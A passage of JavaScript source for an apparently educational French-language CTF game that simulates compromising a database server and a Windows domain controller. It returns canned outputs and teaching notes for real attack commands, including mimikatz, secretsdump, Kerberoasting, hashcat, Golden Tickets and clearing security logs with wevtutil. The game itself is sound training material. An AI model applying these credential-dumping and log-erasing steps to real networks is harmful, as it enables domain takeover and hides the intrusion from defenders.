      stateChanges: { machinePhase: 3, rootObtained: true }
    };
  }

  // cat /flag.txt
  if (cmd === 'cat') {
    const target = args[0];
    if (['/flag.txt', 'flag.txt', '/root/flag.txt'].includes(target)) {
      if (phase < 3) return { output: `\x1b[31mcat: ${target}: Permission denied\x1b[0m\nExploite d\'abord la base de données.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
      return captureFlagAndFinish(machine, state, scenario);
    }
    return { output: `cat: ${target || ''}: No such file or directory`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'scores' || cmd === 'scoreboard') {
    return { output: '', pedagogie: null, effect: { type: 'SHOW_SCORES' }, xpBonus: 0, stateChanges: {} };
  }

  return {
    output: `\x1b[31mERROR 1064 (42000): Syntax error or command not found: '${cmd}'\x1b[0m\nTape \x1b[33mhelp\x1b[0m pour les commandes disponibles.`,
    pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
  };
}

// ─── Machine mode — Windows/WinRM (Domain Controller) ────────────────────────

function handleDCMachine(cmd, args, state, machine) {
  const scenario = MACHINE_SCENARIOS.dc;
  const phase = state.machinePhase;
  const fullCmd = [cmd, ...args].join(' ');

  if (cmd === 'help') {
    return {
      output: [
        '\x1b[36m╔══════════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  WinRM SHELL — Domain Controller         ║\x1b[0m',
        '\x1b[36m╚══════════════════════════════════════════╝\x1b[0m',
        '',
        '\x1b[33mRECONNAISSANCE :\x1b[0m',
        '  whoami /all                 Identité + groupes + privileges',
        '  net user /domain            Tous les utilisateurs du domaine',
        '  hostname / systeminfo       Infos système',
        '  recon                       Résumé AD complet',
        '',
        '\x1b[33mENUMÉRATION AD :\x1b[0m',
        '  net localgroup "Domain Admins"    Admins du domaine',
        '  net group "Domain Controllers"    Contrôleurs de domaine',
        '  GetUserSPNs.py / bloodhound       Kerberoasting / chemin DA',
        '',
        '\x1b[33mEXPLOITATION :\x1b[0m',
        '  secretsdump / mimikatz / Invoke-Mimikatz',
        '  hashcat -m 1000 hash.txt rockyou.txt',
        '',
        '\x1b[33mPOST-EXPLOITATION :\x1b[0m',
        '  type C:\\flag.txt   ou   cat /flag.txt',
        '',
        '  exit → revenir au réseau',
      ].join('\n'),
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  if (cmd === 'hint') {
    const hints = [
      ['\x1b[33m💡 Phase RECON :\x1b[0m', '  \x1b[36mwhoami /all\x1b[0m  ou  \x1b[36mnet user /domain\x1b[0m  ou  \x1b[36mrecon\x1b[0m'],
      ['\x1b[33m💡 Phase ENUM :\x1b[0m', '  \x1b[36mnet localgroup "Domain Admins"\x1b[0m  ou  \x1b[36mGetUserSPNs.py\x1b[0m'],
      ['\x1b[33m💡 Phase EXPLOIT :\x1b[0m', '  \x1b[36msecretsdump\x1b[0m  ou  \x1b[36mmimikatz\x1b[0m'],
      ['\x1b[33m💡 Phase POST :\x1b[0m', '  \x1b[36mtype C:\\flag.txt\x1b[0m'],
    ];
    return { output: hints[Math.min(phase, hints.length-1)].join('\n'), pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'exit') {
    return {
      output: '\x1b[33m[DÉCONNEXION] Fermeture de la session WinRM\x1b[0m',
      pedagogie: 'Nettoyage post-exploitation Windows : supprimer les logs (wevtutil cl Security), les fichiers déposés, et les comptes créés.',
      effect: { type: 'EXIT_MACHINE' },
      xpBonus: 0,
      stateChanges: { mode: 'NETWORK', currentMachine: null, rootObtained: false }
    };
  }

  // Phase 0→1 : whoami /all / net user / hostname / recon
  const reconCmds = ['recon', 'hostname', 'systeminfo'];
  const isWhoamiAll = cmd === 'whoami' && args.includes('/all');
  const isNetUser = cmd === 'net' && args.includes('user');
  if (reconCmds.includes(cmd) || isWhoamiAll || isNetUser || cmd === 'whoami') {
    if (phase >= 1) {
      const user = 'CORP\\Administrator';
      const uid = '\x1b[32mUID: Administrator — Domain Admins, Schema Admins, Enterprise Admins\x1b[0m';
      return { output: cmd === 'whoami' ? user : uid, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    const pr = scenario.phase_recon;
    return {
      output: [
        '\x1b[36m╔═══════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  PHASE 1 — RECONNAISSANCE AD          ║\x1b[0m',
        '\x1b[36m╚═══════════════════════════════════════╝\x1b[0m',
        '',
        ...pr.reveals.map(r => `\x1b[33m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ +${pr.xp} XP\x1b[0m`,
        '\x1b[37m→ net localgroup "Domain Admins" / GetUserSPNs.py / bloodhound\x1b[0m',
      ].join('\n'),
      pedagogie: 'whoami /all affiche le token d\'accès complet : SID, groupes, et privileges Windows (SeDebugPrivilege, SeImpersonatePrivilege...). C\'est le premier réflexe en post-exploitation Windows.',
      effect: null, xpBonus: pr.xp,
      stateChanges: { machinePhase: 1 }
    };
  }

  // Phase 1→2 : net localgroup / GetUserSPNs / bloodhound / ldapsearch
  const scanCmds = ['GetUserSPNs.py', 'bloodhound', 'bloodhound-python', 'ldapsearch', 'enum4linux', 'crackmapexec', 'cme'];
  const isNetGroup = cmd === 'net' && (args.includes('localgroup') || args.includes('group'));
  if (scanCmds.includes(cmd) || isNetGroup) {
    if (phase < 1) return { output: '\x1b[31m[!] Lance d\'abord la reconnaissance : whoami /all\x1b[0m', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (phase >= 2) return { output: '\x1b[33m[Déjà fait]\x1b[0m Énumération AD terminée. Passe à l\'exploitation.', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const ps = scenario.phase_scan;
    return {
      output: [
        '\x1b[36m╔═══════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  PHASE 2 — ÉNUMÉRATION ACTIVE DIR.    ║\x1b[0m',
        '\x1b[36m╚═══════════════════════════════════════╝\x1b[0m',
        '',
        ...ps.reveals.map(r => `\x1b[33m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ +${ps.xp} XP\x1b[0m`,
        '\x1b[37m→ secretsdump / mimikatz / Invoke-Mimikatz\x1b[0m',
      ].join('\n'),
      pedagogie: 'BloodHound/SharpHound collecte les relations AD (groupes, ACLs, sessions) et trace des chemins d\'attaque vers Domain Admin. GetUserSPNs.py trouve les comptes avec SPNs → Kerberoasting → crack offline des tickets TGS.',
      effect: null, xpBonus: ps.xp,
      stateChanges: { machinePhase: 2 }
    };
  }

  // Phase 2→3 : secretsdump / mimikatz / hashcat
  const exploitCmds = ['secretsdump', 'secretsdump.py', 'mimikatz', 'invoke-mimikatz', 'lsadump', 'hashcat', 'ntdsutil'];
  const isInvoke = cmd === 'invoke-mimikatz' || (cmd === 'invoke' && args[0]?.toLowerCase().includes('mimikatz'));
  if (exploitCmds.includes(cmd.toLowerCase()) || isInvoke) {
    if (phase < 2) return { output: '\x1b[31m[!] Énumère d\'abord l\'AD : net localgroup "Domain Admins"\x1b[0m', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (phase >= 3) return { output: '\x1b[33m[Déjà fait]\x1b[0m NTDS.dit dumped. Lance : type C:\\flag.txt', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const pe = scenario.phase_exploit;
    return {
      output: [
        '\x1b[36m╔═══════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  PHASE 3 — DUMP DES CREDENTIALS       ║\x1b[0m',
        '\x1b[36m╚═══════════════════════════════════════╝\x1b[0m',
        '',
        ...pe.reveals.map(r => `\x1b[31m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ +${pe.xp} XP\x1b[0m`,
        '\x1b[37m→ type C:\\flag.txt  pour capturer le flag final\x1b[0m',
      ].join('\n'),
      pedagogie: 'secretsdump.py (Impacket) extrait les hashes depuis NTDS.dit (base AD) + SYSTEM hive. Mimikatz/sekurlsa::logonpasswords lit les credentials en mémoire (LSASS). Golden Ticket : forger un ticket Kerberos avec le hash krbtgt, valide 10 ans sur tout le domaine.',
      effect: null, xpBonus: pe.xp,
      stateChanges: { machinePhase: 3, rootObtained: true }
    };
  }

  // Flag
  if (cmd === 'type' || cmd === 'cat') {
    const target = args[0] || '';
    const isFlag = target.toLowerCase().includes('flag') || target.toLowerCase().includes('flag.txt');
    if (isFlag) {
      if (phase < 3) return { output: `\x1b[31mAccess is denied.\x1b[0m\nDumpe d\'abord les credentials : secretsdump ou mimikatz`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
      return captureFlagAndFinish(machine, state, scenario);
    }
    if (target.includes('hosts') || target.includes('\\hosts')) {
      return { output: '192.168.1.1  firewall.corp.local\n192.168.1.10 web.corp.local\n192.168.1.20 mail.corp.local\n192.168.1.30 db.corp.local\n192.168.1.100 dc.corp.local', pedagogie: null, effect: null, xpBonus: 5, stateChanges: {} };
    }
    return { output: `The system cannot find the file specified: ${target}`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'dir' || cmd === 'ls') {
    return {
      output: [
        ` Directory of C:\\Users\\Administrator\\Desktop`,
        '',
        '01/15/2024  09:23 AM    <DIR>          .',
        '01/15/2024  09:23 AM    <DIR>          ..',
        '01/15/2024  09:23 AM                45 flag.txt',
        '01/10/2024  11:42 AM               847 NEXUS_Corp_Confidential.docx',
      ].join('\n'),
      pedagogie: null, effect: null, xpBonus: 5, stateChanges: {}
    };
  }

  if (cmd === 'scores' || cmd === 'scoreboard') {
    return { output: '', pedagogie: null, effect: { type: 'SHOW_SCORES' }, xpBonus: 0, stateChanges: {} };
  }

  return {
    output: `\x1b[31m'${cmd}' is not recognized as an internal or external command.\x1b[0m\nTape \x1b[33mhelp\x1b[0m pour les commandes disponibles.`,
    pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
  };
}

// ─── Capture du flag (partagé) ────────────────────────────────────────────────

function captureFlagAndFinish(machine, state, scenario) {
  const pp = scenario.phase_post;
  const alreadyPwned = state.pwnedMachines.includes(machine.id);
  const newPwned = alreadyPwned ? state.pwnedMachines : [...state.pwnedMachines, machine.id];
  const newUnlocked = [...new Set([...state.unlockedMachines, ...(pp.unlocksMachines || [])])];

  const unlockMsg = (pp.unlocksMachines || []).map(id => {
    const m = MACHINES.find(x => x.id === id);
    return m ? `\x1b[32m🔓 ${m.name} (${m.ip}) — débloqué !\x1b[0m` : '';
  }).filter(Boolean);

  return {
    output: [
      '\x1b[32m╔══════════════════════════════════════════╗\x1b[0m',
      '\x1b[32m║          🚩 FLAG CAPTURÉ !               ║\x1b[0m',
      '\x1b[32m╚══════════════════════════════════════════╝\x1b[0m',
      '',
      `\x1b[33m${pp.flag}\x1b[0m`,
      '',
      ...pp.reveals.slice(-2).map(r => r),
      '',
      `\x1b[36m+${pp.xp} XP — ${machine.name} compromise !\x1b[0m`,
      ...(unlockMsg.length ? ['', ...unlockMsg] : []),
      '',
      '\x1b[37mTape "exit" pour revenir au réseau et continuer.\x1b[0m',
      '',
      pp.gameWin
        ? '\x1b[35mORACLE > C\'est terminé. Les preuves sont entre les mains des journalistes.\x1b[0m\n\x1b[35mORACLE > NEXUS Corp ne s\'en remettra pas.\x1b[0m\n\x1b[32m🏆 CYBERQUEST COMPLÉTÉ !\x1b[0m'
        : `\x1b[35mORACLE > ${machine.name} compromise. Il reste des cibles.\x1b[0m`,
    ].filter(s => s !== '').join('\n'),
    pedagogie: 'En CTF : le flag prouve la compromission. En pentest réel : on documente chaque étape avec des screenshots, commandes et outputs → rapport d\'audit avec niveau de criticité (CVSS) et recommandations.',
    effect: { type: 'FLAG_FOUND', machineId: machine.id, flag: pp.flag, gameWin: !!pp.gameWin },
    xpBonus: pp.xp,
    stateChanges: {
      pwnedMachines: newPwned,
      unlockedMachines: newUnlocked,
      machinePhase: 4,
      ...(pp.gameWin ? { gameWon: true } : {})
    }
  };
}

// ─── Machine mode dispatcher ──────────────────────────────────────────────────

function handleMachine(cmd, args, state) {
  const machine = state.currentMachine;
  if (!machine) return { output: 'Erreur: aucune machine active.', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

  if (machine.id === 'dbserver') return handleDBMachine(cmd, args, state, machine);
  if (machine.id === 'dc')       return handleDCMachine(cmd, args, state, machine);
  return handleLinuxMachine(cmd, args, state, machine);
}

// ─── Main entry point ─────────────────────────────────────────────────────────

function processCommand(rawInput, state) {
  if (!rawInput || !rawInput.trim()) return { output: '', pedagogie: null, effect: null, newState: state };

  const trimmed = rawInput.trim();
  const parts = trimmed.split(/\s+/);
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);

  if (cmd === 'clear') return { output: '\x1b[2J\x1b[H', pedagogie: null, effect: { type: 'CLEAR' }, newState: state };

  const mode = state.mode || 'NETWORK';
  const result = mode === 'MACHINE' ? handleMachine(cmd, args, state) : handleNetwork(cmd, args, state);

  const newState = {
    ...state,
    xp: state.xp + (result.xpBonus || 0),
    ...result.stateChanges
  };

  return { output: result.output, pedagogie: result.pedagogie, effect: result.effect, newState };
}

module.exports = { processCommand, MACHINES };
